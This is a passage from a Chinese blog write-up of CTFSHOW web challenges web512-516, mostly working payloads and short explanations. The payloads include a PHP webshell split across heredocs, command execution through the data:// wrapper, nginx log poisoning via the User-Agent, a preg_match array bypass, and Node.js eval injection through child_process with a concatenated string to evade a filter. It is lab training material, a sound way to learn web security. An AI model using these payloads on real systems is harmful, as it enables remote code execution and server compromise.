+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;nickname=1;</span><br><span class="line">$a=&lt;&lt;&lt;ctf</span><br><span class="line">&lt;?php includ</span><br><span class="line">ctf;</span><br><span class="line">$b=&lt;&lt;&lt;ctf</span><br><span class="line">e $</span><br><span class="line">ctf;</span><br><span class="line">$c=&lt;&lt;&lt;ctf</span><br><span class="line">_POS</span><br><span class="line">ctf;</span><br><span class="line">$d=&lt;&lt;&lt;ctf</span><br><span class="line">T&#123;1&#125;;?&gt;</span><br><span class="line">ctf;</span><br><span class="line">$n=&lt;&lt;&lt;ctf</span><br><span class="line">1.php</span><br><span class="line">ctf;</span><br><span class="line">$e=clone $db;</span><br><span class="line">$e-&gt;log-&gt;log=$n;</span><br><span class="line">$e-&gt;log-&gt;content=$a.$b.$c.$d;</span><br></pre></td></tr></table></figure>
+
+<p>POST发包到<code>api/admin_edit.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922220617214.png"></p>
+<p>然后跟上题一样新增模板，模板在后端渲染后会生成<code>1.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">名称：1.sml</span><br><span class="line">内容：1&#123;&#123;var:nickname&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922220705372.png"></p>
+<p>访问<code>1.php</code>，然后用data伪协议执行命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=data://text/plain,&lt;?php system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250922221021079.png"></p>
+<h3 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h3><p>这次过滤更加严格了，那咱们换个方法</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923160424549.png"></p>
+<p>发现下面多了一个<code>checkFoot</code>函数，具体代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line">		<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">		<span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line">			<span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会读取<code>config/settings</code>的内容进行反序列化，根据前面的题目，对应的文件为<code>api/admin_settings.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923160728891.png"></p>
+<p>也就是会把系统配置功能处的数据存入<code>$config</code>数组，然后<code>$config[&#39;cnzz&#39;]</code>对应的是页面统计</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923160940861.png"></p>
+<p>因为<code>render/render_class.php</code>有个<code>$foot=file_get_contents($foot)</code>，然后再进行include操作，那我们可以在页面统计放入一个文件地址，然后这个文件的内容是另一个文件的地址，这样就可以进行文件包含</p>
+<p>先写一个模板到templates目录下，内容为<code>/var/log/nginx/access.log</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923162228362.png"></p>
+<p>然后页面统计写<code>/var/www/html/templates/1.sml</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923162341111.png"></p>
+<p>接着写入模板<code>2.sml</code>，内容为<code>1&#123;&#123;cnzz&#125;&#125;</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923162519743.png"></p>
+<p>最后访问<code>index.php?action=view&amp;page=2</code>，成功读取到<code>/var/log/nginx/access.log</code>内容</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923162834910.png"></p>
+<p>然后进行日志文件执行命令即可，UA头写入一句话木马，读取flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923163127449.png"></p>
+<h3 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h3><p>这次加了过滤，可以用data伪协议来做</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923164548673.png"></p>
+<p>我们传入<code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B</code>，但是如果直接传入是不行的，因为有过滤</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923171114974.png"></p>
+<p><code>preg_match</code>的话我们可以用<strong>数组绕过</strong>，因为<code>preg_match</code>的第二个参数（待匹配内容）必须是字符串，如果传入的是数组，<code>preg_match</code>会返回false而不是报错，如图所示传入</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923173841822.png"></p>
+<p>验证一下，可以看到成功写入了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923173857526.png"></p>
+<p>剩余的步骤跟上题一样，系统配置页面的页面统计写入地址<code>/var/www/html/templates/1.sml</code>，然后新增模板<code>2.sml</code>，内容<code>1&#123;&#123;cnzz&#125;&#125;</code>，最后访问<code>index.php?action=view&amp;page=2</code>执行命令即可</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923174121881.png"></p>
+<h3 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h3><p>先看代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;我是复读机&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">		msg = req.<span class="property">body</span>.<span class="property">user</span>;</span><br><span class="line">		<span class="keyword">if</span>((msg.<span class="title function_">match</span>(<span class="regexp">/proto|process|require|exec|var|&#x27;|&quot;|:|\[|\]|[0-9]/</span>))!==<span class="literal">null</span> || msg.<span class="property">length</span>&gt;<span class="number">40</span>)&#123;</span><br><span class="line">		  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;敏感信息不复读&#x27;</span> &#125;);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(msg) &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;我是复读机&#x27;</span> &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<p>之前做过类似的题，我们eval嵌套执行就好，GET传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?a=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;/flag&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+<p>然后body传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=eval(req.query.a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923204355810.png"></p>
+<h3 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h3><p>下载附件进行分析，其中关键代码为<code>index.js</code>里面的登录成功后显示处，会执行eval函数</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213253625.png"></p>
+<p>但是<code>app.js</code>有限制</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213009750.png"></p>
+<p>不能出现这些字符串，那我们用反引号拼接字符串就可以，还是用上题的代码，修改一下即可</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)+eval((`req`+`uire(&#x27;child_pro`+`cess&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString()`)</span><br></pre></td></tr></table></figure>
+
+<p>先进行注册</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213518460.png"></p>
+<p>再点击<code>sign in</code>登录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213554953.png"></p>
+<p>成功执行命令</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213614065.png"></p>
+<p>同理，我们修改一下执行命令env，成功找到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)+eval((`req`+`uire(&#x27;child_pro`+`cess&#x27;).spawnSync(&#x27;env&#x27;).stdout.toString()`)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250923213754016.png"></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>CTFSHOW 中期测评（二） web502 - web516</p><p><a href="https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/">https://waynejoon.github.io/posts/ctfshow-mid-term-assessment-2-web502-web516/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>WayneJoon.H</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-09-23</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/CTFSHOW/">CTFSHOW, </a><a class="link-muted" rel="tag" href="/tags/CTF%E7%BB%83%E4%B9%A0/">CTF练习 </a></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/ctfshow-mid-term-assessment-web486-web501/"><span class="level-item">CTFSHOW 中期测评（一） web486 - web501</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/waynejoon.jpg" alt="WayneJoon.H"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">WayneJoon.H</p><p class="is-size-6 is-block">记录学习生活</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">25</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/waynejoon" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#题目列表"><span class="level-left"><span class="level-item">1</span><span class="level-item">题目列表</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web502"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">web502</span></span></a></li><li><a class="level is-mobile" href="#web503"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">web503</span></span></a></li><li><a class="level is-mobile" href="#web504"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">web504</span></span></a></li><li><a class="level is-mobile" href="#web505"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">web505</span></span></a></li><li><a class="level is-mobile" href="#web506"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">web506</span></span></a></li><li><a class="level is-mobile" href="#web507"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">web507</span></span></a></li><li><a class="level is-mobile" href="#web508"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">web508</span></span></a></li><li><a class="level is-mobile" href="#web509"><span class="level-left"><span class="level-item">1.8</span><span class="level-item">web509</span></span></a></li><li><a class="level is-mobile" href="#web510"><span class="level-left"><span class="level-item">1.9</span><span class="level-item">web510</span></span></a></li><li><a class="level is-mobile" href="#web511"><span class="level-left"><span class="level-item">1.10</span><span class="level-item">web511</span></span></a></li><li><a class="level is-mobile" href="#web512"><span class="level-left"><span class="level-item">1.11</span><span class="level-item">web512</span></span></a></li><li><a class="level is-mobile" href="#web513"><span class="level-left"><span class="level-item">1.12</span><span class="level-item">web513</span></span></a></li><li><a class="level is-mobile" href="#web514"><span class="level-left"><span class="level-item">1.13</span><span class="level-item">web514</span></span></a></li><li><a class="level is-mobile" href="#web515"><span class="level-left"><span class="level-item">1.14</span><span class="level-item">web515</span></span></a></li><li><a class="level is-mobile" href="#web516"><span class="level-left"><span class="level-item">1.15</span><span class="level-item">web516</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">WayneJH</a><p class="is-size-7"><span>&copy; 2025 WayneJoon.H</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script data-pjax src="/js/busuanzi-fix.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
